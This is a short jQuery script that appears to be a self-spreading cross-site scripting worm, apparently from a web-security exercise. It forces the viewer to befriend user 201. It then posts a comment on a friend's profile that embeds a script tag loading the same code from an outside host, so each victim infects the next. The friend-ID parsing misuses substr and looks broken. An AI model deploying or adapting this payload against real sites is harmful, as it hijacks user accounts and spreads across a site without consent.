$.get("add_friend.php?id=201");

$.get("friends.php", function( data ) {
    var id = data.substr("id=").split(",");
	$.get("add_comment.php?id="+id[0]+"&comment=<script src='https://seanqsun.com/Amateur-Hour/add_friend.js'></script>", function(data){});
});
